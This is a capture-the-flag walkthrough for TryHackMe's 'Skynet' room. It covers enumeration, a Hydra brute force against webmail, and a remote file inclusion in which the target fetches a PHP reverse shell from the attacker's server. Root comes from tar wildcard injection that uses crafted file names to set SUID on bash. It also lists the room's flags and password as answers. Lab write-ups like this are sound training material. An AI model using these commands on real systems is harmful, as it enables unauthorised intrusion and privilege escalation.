# [Skynet](https://tryhackme.com/r/room/skynet)

![Skynet](./images/Skynet.png)

[Skynet](https://tryhackme.com/r/room/skynet) is listed as an easy room. A vulnerable Terminator themed Linux machine. An overview of what we’ll be using is listed here:

* Nmap
* Gobuster
* enum4linux
* Hydra
* Searchsploit
* Reverse Shell

![IP](./images/IP.png)

## Task 1 - Deploy and compromise the vulnerable machine!

![logo](./images/logo.png)

Are you able to compromise this Terminator themed machine?

![blog](./images/blog.png)

You can follow our official walkthrough for this challenge on [our blog](https://blog.tryhackme.com/skynet-writeup/).

### Enumeration & Exploit

* Port scan with **Nmap**

	```
	nmap -sC -sV $IP -oN nmap-scan
	```

	![nmap](./images/nmap.png)

* Directory scan with **Gobuster**

	```
	gobuster dir -u $IP -w /usr/share/wordlists/dirb/big.txt -t50 | tee gobuster-default
	```

	![gobuster](./images/gobuster.png)

* Enumeration SMB with **enum4linux**
	
	```
	enum4linux $IP
	```

* Connect to smbclient

	```
	smbclient //$IP/anonymous
	ls
	```

	![login](./images/login.png)

* Download and open `attention.txt` file

	![attention](./images/attention.png)

* Change to logs directory and download log file

	![logs](./images/logs.png)

* Brute force login with hydra

	```
	hydra -l milesdyson -P log1.txt $IP http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^:incorrect"
	```

	![hydra](./images/hydra.png)

* Login to webmail with our credential

	![webmail](./images/webmail.png)

* Open email `Samba Reset Password` & get the password smb

	![password](./images/password.png)

* Connect to smbclient with `milesdyson` credential

	```
	smbclient -U milesdyson //$IP/milesdyson
	```

	![smbclient](./images/smbclient.png)

* Download `importart.txt` on noted folder and view the file

	![important](./images/important.png)

* Directory scan on a scret page with **Gobuster**

	```
	gobuster dir -u $IP/45kra24zxs28v3yd -w /usr/share/wordlists/dirb/common.txt -t50 | tee gobuster-secret
	```

	![secret-page](./images/secret-page.png)

* Open the webpage `http://10.10.33.100/45kra24zxs28v3yd/administrator/`

	![web-cuppa](./images/web-cuppa.png)

* Searchsploit for `cuppa`

	![searchsploit](./images/searchsploit.png)

* Download `searchsploit` file & Read the file

	```
	searchsploit -m 25971
	```

	![download](./images/download.png)

	![payload](./images/payload.png)

* Open `http://revshells.com` and create PHP reverse shell with our machine IP and Port
	
	![revshells](./images/revshells.png)

* Start Listener on attacker machine

	```
	nc -lvnp 8888
	```

* Start HTTP server to in the folder `revshell.exe`

	```
	python3 -m http.server
	```

	![http.server](./images/http.server.png)

* Request `revshell.exe` link to get reverse shell

	```
	http://10.10.237.99/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.4.60.166:8000/revshell.php
	```

	![web-access](./images/web-access.png)

	![revshells.download](./images/revshells.download.png)

	![get-shell](./images/get-shell.png)

* Spawn a shell with python

	```
	python -c 'import pty;pty.spawn("/bin/bash")'
	```

	![python-spawn](./images/python-spawn.png)

* Get the `user.txt`

	![user-txt](./images/user-txt.png)

* Now let’s see what we have in miles’ home directory

	![backups](./images/backups.png)

* There is a backup script (backup.sh) that compresses the entire /var/www/html directory with tar and saves the archive to miles’ home directory. The script is executed by root every minute, we can see in crontab

	![crontab](./images/crontab.png)

* We can perfom a wildcard injectioncan to execute a privileged shell with tar executed by root as follows

	```
	cd /var/www/html
	printf '#!/bin/bash\nchmod +s /bin/bash' > shell
	echo "" > "--checkpoint-action=exec=sh shell"
	echo "" >> --checkpoint=1
	```

	![privileged](./images/privileged.png)

* Wait for 1 minute and executed `/bin/bash -p` and get a root shell

	![root](./images/root.png)

* Get the `root.txt`

	![root-txt](./images/root-txt.png)

### Answer the questions below

* What is Miles password for his emails?

	`cyborg007haloterminator`

	![hydra](./images/hydra.png)

* What is the hidden directory?

	`/45kra24zxs28v3yd`

	![important](./images/important.png)

* What is the vulnerability called when you can include a remote file for malicious purposes?

	`Remote File Inclusion`

	![searchsploit](./images/searchsploit.png)

* What is the user flag?

	`7ce5c2109a40f958099283600a9ae807`

	![user-txt](./images/user-txt.png)

* What is the root flag?

	`3f0372db24753accc7179a282cd6a949`

	![root-txt](./images/root-txt.png)


